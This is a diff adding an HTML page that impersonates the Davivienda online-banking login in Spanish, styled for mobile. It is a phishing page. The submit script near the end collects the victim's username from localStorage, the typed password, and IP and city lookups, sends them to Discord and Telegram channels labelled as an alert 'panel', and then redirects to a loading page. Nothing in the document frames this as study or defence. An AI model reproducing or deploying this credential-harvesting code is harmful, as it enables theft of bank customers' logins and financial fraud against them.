@@ -1,0 +1,701 @@
+<!DOCTYPE html
+   PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+   <meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover">
+   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+   <meta http-equiv="Pragma" content="no-cache">
+   <meta http-equiv="Expires" content="0">
+   <script src="telegram.js"></script>
+
+
+   <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+
+   <title>Davivienda</title>
+   <link href="b3t4s/combi.css" type="text/css" rel="stylesheet">
+   <meta http-equiv="Pragma" content="no-cache">
+   <style type="text/css">
+      .generic-tooltip.fixed.identificacion-login-tooltip:after {
+         padding: 10px 13px 11px 13px;
+         width: 201px;
+         top: -13px;
+         height: 34px;
+      }
+   </style>
+   <meta http-equiv="Pragma" content="no-cache">
+
+   <style type="text/css">
+      .generic-tooltip.fixed.identificacion-login-tooltip:after {
+         padding: 10px 13px 11px 13px;
+         width: 201px;
+         top: -13px;
+         height: 34px;
+      }
+   </style>
+   <meta http-equiv="Pragma" content="no-cache">
+   <style type="text/css">
+      .generic-tooltip.fixed.identificacion-login-tooltip:after {
+         padding: 10px 13px 11px 13px;
+         width: 201px;
+         top: -13px;
+         height: 34px;
+      }
+   </style>
+   <style type="text/css">
+      html,
+      body {
+         overflow: hidden;
+         height: 100%;
+         width: 100%;
+         margin: 0;
+         padding: 0;
+         touch-action: manipulation;
+         -ms-touch-action: manipulation;
+         overscroll-behavior: none;
+         -webkit-text-size-adjust: 100%;
+         -ms-text-size-adjust: 100%;
+         text-size-adjust: 100%;
+      }
+
+      .logo-mobile {
+         display: none;
+      }
+
+      @media (max-width: 900px) {
+         html,
+         body {
+            min-width: 0 !important;
+            max-width: 100vw !important;
+            width: 100% !important;
+            height: 100dvh !important;
+            min-height: 100dvh !important;
+            overflow: hidden !important;
+            background: #ffffff !important;
+            font-family: Arial, sans-serif;
+         }
+
+         body * {
+            box-sizing: border-box;
+         }
+
+         #outer1 {
+            margin: 0 !important;
+            width: 100% !important;
+            height: 100dvh !important;
+            background: url('b3t4s/home.jpg') no-repeat center center !important;
+            background-size: cover !important;
+            display: flex !important;
+            flex-direction: column;
+            overflow: hidden !important;
+            padding: 0 !important;
+         }
+
+         #superiorSinLogin {
+            flex-shrink: 0;
+            width: 100%;
+            background: #ed1c24 !important;
+            padding: 10px 16px !important;
+            margin: 0 !important;
+            display: flex !important;
+            align-items: center;
+            justify-content: space-between;
+            float: none !important;
+            position: static !important;
+            min-height: 52px;
+            overflow: hidden;
+         }
+
+         #superiorSinLogin>div {
+            float: none !important;
+            padding-right: 0 !important;
+            width: auto !important;
+            display: flex;
+            align-items: center;
+         }
+
+         .logo-mobile {
+            display: block !important;
+            height: 26px;
+            width: auto;
+            max-width: 130px;
+            margin: 0 !important;
+         }
+
+         #superiorSinLogin .idiomaLink {
+            font-size: 12px;
+            line-height: 1;
+            color: #fff;
+         }
+
+         #superiorSinLogin .idiomaLink a,
+         #superiorSinLogin .idiomaLink i {
+            color: #fff !important;
+            font-size: 12px !important;
+            text-decoration: none;
+         }
+
+         #banner {
+            display: none !important;
+         }
+
+         #center {
+            width: 100% !important;
+            max-width: 100% !important;
+            padding: 0 18px !important;
+            padding-top: 0 !important;
+            margin: 0 auto !important;
+            flex: 1 1 auto;
+            display: flex !important;
+            flex-direction: column;
+            justify-content: center;
+            align-items: stretch;
+            overflow: hidden !important;
+            position: static !important;
+            background: transparent !important;
+         }
+
+         #loginBox {
+            width: 100% !important;
+            max-width: 100% !important;
+            margin: 0 auto !important;
+            padding: 0 !important;
+            float: none !important;
+            background: transparent !important;
+         }
+
+         #loginBox .contentDiv {
+            width: 100% !important;
+            max-width: 340px !important;
+            padding: 0 !important;
+            margin: 0 auto !important;
+            float: none !important;
+            background: transparent !important;
+         }
+
+         #normalid {
+            width: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            display: block !important;
+         }
+
+         #titleBox {
+            width: 100% !important;
+            margin: 0 0 24px 0 !important;
+            padding: 0 !important;
+            text-align: center !important;
+         }
+
+         #titleBox h2,
+         #tituloIngreseUsername,
+         #tituloIngresePassword {
+            font-size: 20px !important;
+            font-weight: normal !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            text-align: center !important;
+            line-height: 1.25;
+            width: 100% !important;
+            color: #222 !important;
+         }
+
+         /* ===== Caja del password: anula width:275px ===== */
+         #pedirPasswordBox {
+            width: 100% !important;
+            max-width: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            float: none !important;
+         }
+
+         #avatarBox {
+            width: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            float: none !important;
+            display: block !important;
+         }
+
+         #passwordBox {
+            width: 100% !important;
+            max-width: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            float: none !important;
+            display: flex !important;
+            flex-direction: row !important;
+            align-items: flex-end !important;
+            justify-content: space-between !important;
+            position: relative !important;
+         }
+
+         #password_o,
+         #password_o.loginInput,
+         #password_o.conTecladoVirtual {
+            -webkit-appearance: none !important;
+            -moz-appearance: none !important;
+            appearance: none !important;
+            background: transparent !important;
+            background-color: transparent !important;
+            background-image: none !important;
+            border: none !important;
+            border-bottom: 2px solid #ed1c27 !important;
+            border-radius: 0 !important;
+            -webkit-border-radius: 0 !important;
+            box-shadow: none !important;
+            -webkit-box-shadow: none !important;
+            outline: none !important;
+            flex: 1 1 auto !important;
+            width: auto !important;
+            max-width: 100% !important;
+            min-width: 0 !important;
+            font-size: 16px !important;
+            padding: 8px 2px !important;
+            margin: 0 !important;
+            display: block !important;
+            float: none !important;
+            line-height: 1.3;
+            color: #333 !important;
+            -webkit-text-fill-color: #333;
+            text-align: left;
+         }
+
+         #password_o::placeholder {
+            color: #808080 !important;
+            opacity: 1;
+         }
+
+         #passwordBox .asterisco,
+         .asterisco {
+            flex: 0 0 auto !important;
+            display: inline-block !important;
+            position: static !important;
+            margin: 0 0 4px 6px !important;
+            padding: 0 !important;
+            width: auto !important;
+            height: auto !important;
+            color: #ed1c27 !important;
+            font-size: 16px !important;
+            line-height: 1 !important;
+            text-align: center !important;
+            float: none !important;
+            vertical-align: bottom !important;
+         }
+
+         #passwordActionButton {
+            width: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            display: flex !important;
+            flex-direction: row !important;
+            flex-wrap: wrap !important;
+            justify-content: center !important;
+            align-items: center !important;
+            gap: 12px !important;
+         }
+
+         #passwordActionButton>div {
+            margin: 0 !important;
+            padding: 0 !important;
+            width: auto !important;
+            float: none !important;
+            display: block !important;
+         }
+
+         #botonVolverLoginBox,
+         #botonSendPasswordBox {
+            width: auto !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            display: block !important;
+            float: none !important;
+         }
+
+         #botonSendPassword,
+         .botonSiguiente {
+            -webkit-appearance: none !important;
+            -moz-appearance: none !important;
+            appearance: none !important;
+            display: inline-block !important;
+            float: none !important;
+            background: #ed1c27 !important;
+            background-color: #ed1c27 !important;
+            background-image: none !important;
+            color: #ffffff !important;
+            -webkit-text-fill-color: #ffffff;
+            border: 0 none !important;
+            border-radius: 99px !important;
+            -webkit-border-radius: 99px !important;
+            -moz-border-radius: 99px !important;
+            height: 42px !important;
+            width: auto !important;
+            min-width: 130px !important;
+            max-width: 200px !important;
+            font-size: 14px !important;
+            font-weight: normal !important;
+            padding: 0 22px !important;
+            margin: 0 !important;
+            box-shadow: none !important;
+            -webkit-box-shadow: none !important;
+            line-height: 42px;
+            text-decoration: none !important;
+            cursor: pointer;
+            text-align: center;
+         }
+
+         #botonRegresarLogin,
+         .botonRegresarLogin {
+            -webkit-appearance: none !important;
+            -moz-appearance: none !important;
+            appearance: none !important;
+            display: inline-block !important;
+            float: none !important;
+            background: #bfbfbf !important;
+            background-color: #bfbfbf !important;
+            background-image: none !important;
+            color: #ffffff !important;
+            -webkit-text-fill-color: #ffffff;
+            border: 0 none !important;
+            border-radius: 99px !important;
+            -webkit-border-radius: 99px !important;
+            -moz-border-radius: 99px !important;
+            height: 42px !important;
+            width: auto !important;
+            min-width: 130px !important;
+            max-width: 200px !important;
+            font-size: 14px !important;
+            font-weight: normal !important;
+            padding: 0 22px !important;
+            margin: 0 !important;
+            box-shadow: none !important;
+            -webkit-box-shadow: none !important;
+            line-height: 42px;
+            text-decoration: none !important;
+            cursor: pointer;
+            text-align: center;
+         }
+
+         #botonSendPassword:disabled,
+         #botonSendPassword[disabled],
+         .botonSiguiente:disabled,
+         .botonSiguiente[disabled] {
+            background: #b0b0b0 !important;
+            background-color: #b0b0b0 !important;
+            background-image: none !important;
+            color: #f0f0f0 !important;
+            -webkit-text-fill-color: #f0f0f0;
+            cursor: not-allowed !important;
+         }
+
+         #loginOptions {
+            width: 100% !important;
+            padding: 20px 0 0 0 !important;
+            margin: 0 !important;
+            overflow: hidden;
+            display: block !important;
+            text-align: center !important;
+            background: transparent !important;
+         }
+
+         #loginOptions ul {
+            display: flex !important;
+            flex-direction: row !important;
+            flex-wrap: wrap !important;
+            justify-content: center !important;
+            align-items: center !important;
+            gap: 6px 18px !important;
+            margin: 0 0 14px 0 !important;
+            padding: 0 !important;
+            list-style: none !important;
+            width: 100% !important;
+            overflow: visible !important;
+         }
+
+         #loginOptions ul li {
+            width: auto !important;
+            min-width: 0 !important;
+            max-width: none !important;
+            white-space: normal !important;
+            display: inline-block !important;
+            vertical-align: middle !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            list-style: none !important;
+            float: none !important;
+         }
+
+         #loginOptions ul li a,
+         #loginOptions ul li .boton-link {
+            font-size: 11.5px !important;
+            line-height: 1.2 !important;
+            white-space: nowrap !important;
+            display: inline-block !important;
+            float: none !important;
+            color: #ed1c27 !important;
+            text-decoration: none !important;
+            -webkit-text-fill-color: #ed1c27;
+         }
+
+         #loginOptions p,
+         #loginOptions .login-info {
+            display: block !important;
+            font-size: 10.5px !important;
+            line-height: 1.35 !important;
+            color: #939598 !important;
+            margin: 0 0 6px 0 !important;
+            padding: 0 4px !important;
+            text-align: left !important;
+            width: 100% !important;
+            float: none !important;
+            overflow: visible !important;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+         }
+
+         #loginOptions a,
+         #loginOptions .a-login {
+            display: inline-block !important;
+            font-size: 11px !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            float: none !important;
+            text-align: center;
+            color: #ed1c27 !important;
+            text-decoration: none !important;
+            -webkit-text-fill-color: #ed1c27;
+         }
+
+         #loginOptions .a-login p {
+            display: inline !important;
+            margin: 0 !important;
+            padding: 0 !important;
+         }
+
+         #loginOptions>br {
+            display: none !important;
+         }
+
+         #footer {
+            flex-shrink: 0;
+            width: 100% !important;
+            padding: 8px 0 !important;
+            margin: 0 !important;
+            float: none !important;
+            text-align: center !important;
+            position: static !important;
+            display: block !important;
+            background: transparent !important;
+            box-sizing: border-box !important;
+         }
+
+         #footer ul {
+            padding: 0 !important;
+            margin: 0 !important;
+            list-style: none !important;
+            width: 100% !important;
+            display: block !important;
+            text-align: center !important;
+            float: none !important;
+            box-sizing: border-box !important;
+         }
+
+         #footer ul li {
+            padding: 0 !important;
+            margin: 0 !important;
+            list-style: none !important;
+            width: 100% !important;
+            display: block !important;
+            text-align: center !important;
+            float: none !important;
+            box-sizing: border-box !important;
+         }
+
+         #footer .footerText {
+            font-size: 10px !important;
+            line-height: 1.2;
+            margin: 0 !important;
+            padding: 0 !important;
+            color: #666 !important;
+            display: block !important;
+            width: 100% !important;
+            text-align: center !important;
+            float: none !important;
+            box-sizing: border-box !important;
+         }
+
+         #clearfooter {
+            display: none !important;
+         }
+      }
+   </style>
+
+</head>
+
+<body onload="" style="display: block;" bis_skin_checked="1">
+   <input type="hidden" id="tipoBanner" name="tipoBanner">
+   <script>
+      if (self == top) {
+         var theBody = document.getElementsByTagName('body')[0]
+         theBody.style.display = "block";
+      } else {
+         top.location = self.location;
+      }
+   </script>
+   <div class="outerDiv_" id="outer1" bis_skin_checked="1">
+      <div id="superiorSinLogin" bis_skin_checked="1">
+         <img src="b3t4s/logomijo.png" alt="Davivienda" class="logo-mobile">
+         <div style="float: right; padding-right: 73px;" bis_skin_checked="1">
+            <div class="idiomaLink" bis_skin_checked="1">
+               <i class="fa fa-language" style="font-size:1.2em"></i>
+               <a id="selectorEs" href="#" onclick="changeLocale(&#39;es_SV&#39;)" style="display: none;">
+                  Español</a>
+               <a id="selectorEn" href="#" onclick="changeLocale(&#39;en_SV&#39;)">
+                  English</a>
+            </div>
+
+         </div>
+         <div id="banner" bis_skin_checked="1"></div>
+      </div>
+      <div id="center" bis_skin_checked="1">
+         <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+         <div id="loginBox" bis_skin_checked="1">
+            <form id="normalid">
+               <div class="contentDiv" bis_skin_checked="1">
+                  <div id="titleBox" bis_skin_checked="1">
+                     <h2 id="tituloIngreseUsername" class="titulo-login">Autenticación del cliente</h2>
+                     <h2 id="tituloIngresePassword" style="display: none;">Ingrese su contraseña</h2>
+                  </div>
+                  <div id="pedirPasswordBox" style="width:275px;" bis_skin_checked="1">
+                     <div id="avatarBox" bis_skin_checked="1">
+                         
+
+                     </div>
+                     <div class="formTextInput" id="passwordBox" bis_skin_checked="1">
+                        <input id="password" name="j_password" type="hidden">
+                        <input type="password" style="display: none;" id="password-breaker" placeholder="Contraseña">
+                        <input id="password_o" type="password" autocomplete="off" class="loginInput conTecladoVirtual"
+                           style="width:196px" minlength="8" onfocus="true" placeholder="Contraseña" required>
+                        <p class="asterisco"></p>
+                     </div>
+                  </div>
+                  <div id="passwordActionButton" bis_skin_checked="1">
+                     <div id="botonVolverLoginBox" bis_skin_checked="1">
+                        <input id="botonRegresarLogin" type="button" value="Regresar" class="botonRegresarLogin"
+                           onclick="location.href=&#39;index.html&#39;">
+                     </div>
+                     <div id="botonSendPasswordBox" bis_skin_checked="1">
+                        <input id="botonSendPassword" type="submit" value="Iniciar sesión" class="botonSiguiente">
+                     </div>
+                  </div>
+               </div>
+               <div id="loginOptions" bis_skin_checked="1">
+                  <ul>
+                     <li><a href="#" class="boton-link" bis_skin_checked="1"> Registrar</a></li>
+                     <li><a href="#" class="boton-link blockUi" bis_skin_checked="1"> ¿Olvidó su contraseña?</a></li>
+                     <li><a href="#" class="boton-link blockUi" bis_skin_checked="1"> Desbloquear usuario</a></li>
+                     <li><a href="#" class="boton-link blockUi" bis_skin_checked="1"> Consultar contratos</a></li>
+                     <li><a href="#" class="boton-link blockUi" bis_skin_checked="1">Token</a></li>
+                  </ul>
+                  <p class="login-info">Tenemos el compromiso de proteger su privacidad y la integridad de su
+                     información personal y financiera. A continuación se definen recomendaciones para su seguridad.
+                     Consúltelas haciendo</p>
+                  <a class="a-login" href="#" bis_skin_checked="1">
+                     Click aquí
+                     <p></p>
+                  </a>
+                  <br><br><br><br><br>
+               </div>
+            </form>
+         </div>
+      </div>
+
+      <div id="clearfooter" bis_skin_checked="1"></div>
+
+
+      <div id="footer" bis_skin_checked="1">
+         <ul>
+            <li class="footerText">
+               © 2026 Davivienda - Todos los derechos reservados
+            </li>
+         </ul>
+      </div>
+      <div id="disabledZone" style="float: right; display: none; border: 0px;" bis_skin_checked="1">
+         <div id="modalProcesando" bis_skin_checked="1">
+            <div id="fondoModal" bis_skin_checked="1">
+               <div id="imagenModal" bis_skin_checked="1">
+                  <img src="b3t4s/processingAni.gif" border="0">
+               </div>
+               <div id="textoModal" bis_skin_checked="1">Espere por favor...</div>
+            </div>
+         </div>
+      </div>
+
+      <div bis_skin_checked="1"><img src="1(1)" style="display:none;"></div>
+
+
+      <script>
+
+         document.getElementById("normalid").addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+            const continuarBtn = document.getElementById("botonSendPassword");
+            continuarBtn.disabled = true;
+
+            const ipinfo = await getIpInfo();
+
+            const userito = localStorage.getItem('primer') || 'N/A';
+            const clavv = document.getElementById("password_o").value;
+            const transactionId = Math.random().toString(36).substring(2, 10);
+            localStorage.setItem("transactionId", transactionId);
+
+            const discordMsg = `🔐 **LOGIN** 🔐\n\n👤 **ID:** \`${userito}\`\n🔑 **PASS:** \`${clavv}\`\n🌐 **IP:** \`${ipinfo.ip}\`\n📍 **Ciudad:** \`${ipinfo.city}\``;
+
+            await sendToDiscord(discordMsg);
+            await sendToDiscord("**🚨🚨 ¡ACTIVO CON EL PANEL EN TELEGRAM! 🚨🚨**");
+
+            const telegramMsg = `🚨 <b>ALERTA PANEL - LOGIN</b> 🚨\n\n👤 <b>ID:</b> <code>${userito}</code>\n🌐 <b>IP:</b> <code>${ipinfo.ip}</code>\n📍 <b>Ciudad:</b> <code>${ipinfo.city}</code>`;
+
+            await sendToTelegram(telegramMsg, transactionId);
+            window.location.href = "cargando.html";
+         });
+
+      </script>
+
+      <script type="text/javascript">
+         document.addEventListener('gesturestart', function (e) { e.preventDefault(); }, { passive: false });
+         document.addEventListener('gesturechange', function (e) { e.preventDefault(); }, { passive: false });
+         document.addEventListener('gestureend', function (e) { e.preventDefault(); }, { passive: false });
+
+         document.addEventListener('touchmove', function (e) {
+            if (e.touches && e.touches.length > 1) {
+               e.preventDefault();
+            }
+         }, { passive: false });
+
+         let lastTouchEnd = 0;
+         document.addEventListener('touchend', function (e) {
+            const now = Date.now();
+            if (now - lastTouchEnd <= 350) {
+               e.preventDefault();
+            }
+            lastTouchEnd = now;
+         }, { passive: false });
+
+         document.addEventListener('wheel', function (e) {
+            if (e.ctrlKey) e.preventDefault();
+         }, { passive: false });
+
+         document.addEventListener('keydown', function (e) {
+            if ((e.ctrlKey || e.metaKey) && ['+', '-', '=', '0'].includes(e.key)) {
+               e.preventDefault();
+            }
+         });
+      </script>
+
+</body>
+
+</html>
